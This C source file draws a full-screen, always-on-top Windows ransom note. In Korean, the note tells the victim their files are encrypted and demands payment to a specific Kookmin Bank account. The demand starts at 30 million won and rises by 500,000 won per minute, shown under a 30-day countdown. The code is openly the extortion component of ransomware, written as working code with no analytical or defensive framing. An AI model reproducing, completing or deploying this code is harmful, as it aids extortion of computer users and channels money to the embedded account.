#pragma execution_character_set("utf-8")
#include <windows.h>
#include <stdio.h>
#include <wchar.h>

#define ID_TIMER            1
#define TIME_LIMIT_SECONDS  (30 * 24 * 60 * 60)
#define BASE_AMOUNT         30000000
#define INCREMENT_PER_MIN   500000

static int   remaining_seconds = TIME_LIMIT_SECONDS;
static HFONT hMainFont;
static HICON hWarnIcon;

static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp)
{
    switch (msg)
    {
    case WM_CREATE:
        SetTimer(hWnd, ID_TIMER, 1000, NULL);
        hMainFont = CreateFontW(-44, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            HANGEUL_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE,
            L"Malgun Gothic");
        hWarnIcon = LoadIcon(NULL, IDI_ERROR);
        break;

    case WM_TIMER:
        if (remaining_seconds > 0) --remaining_seconds;
        InvalidateRect(hWnd, NULL, FALSE);
        break;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC  hdc = BeginPaint(hWnd, &ps);
        RECT rc;  GetClientRect(hWnd, &rc);

        FillRect(hdc, &rc, CreateSolidBrush(RGB(0, 0, 0)));
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(255, 0, 0));
        SelectObject(hdc, hMainFont);

        int d = remaining_seconds / 86400;
        int h = (remaining_seconds % 86400) / 3600;
        int m = (remaining_seconds % 3600) / 60;
        int s = remaining_seconds % 60;
        int cur = BASE_AMOUNT +
            ((TIME_LIMIT_SECONDS - remaining_seconds) / 60) * INCREMENT_PER_MIN;

        wchar_t buf[1024];
        swprintf(buf, _countof(buf),
            L"!!! 당신의 파일은 암호화되었습니다 !!!\n\n"
            L"복구를 원하시면 아래 계좌로 송금하세요.\n"
            L"국민은행 71820101289762\n\n"
            L"요구 금액: %d원\n"
            L"남은 시간: %d일 %02d시간 %02d분 %02d초\n"
            L"시간이 지날수록 비용이 증가합니다.",
            cur, d, h, m, s);

        DrawTextW(hdc, buf, -1, &rc,
            DT_CENTER | DT_VCENTER | DT_WORDBREAK);
        DrawIconEx(hdc, rc.right / 2 - 32, rc.top + 45,
            hWarnIcon, 64, 64, 0, NULL, DI_NORMAL);
        EndPaint(hWnd, &ps);
        break;
    }

    case WM_CLOSE:
        KillTimer(hWnd, ID_TIMER);
        DestroyWindow(hWnd);
        return 0;

    case WM_DESTROY:
        DeleteObject(hMainFont);
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProcW(hWnd, msg, wp, lp);
    }
    return 0;
}

void create_ransom_note(void)
{
    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandleW(NULL);
    wc.lpszClassName = L"RansomNoteWindow";
    wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));
    RegisterClassW(&wc);

    HWND hWnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"RansomNoteWindow", L"WARNING", WS_POPUP | WS_VISIBLE,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, wc.hInstance, NULL);

    if (!hWnd) {
        MessageBoxW(NULL, L"랜섬노트 창 생성 실패", L"Error", MB_ICONERROR);
        return;
    }

    SetLayeredWindowAttributes(hWnd, RGB(0, 0, 0), 0, LWA_COLORKEY);
    ShowWindow(hWnd, SW_SHOW);
    UpdateWindow(hWnd);
    SetForegroundWindow(hWnd);

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, PWSTR lpCmd, int nShow)
{
    create_ransom_note();
    return 0;
}
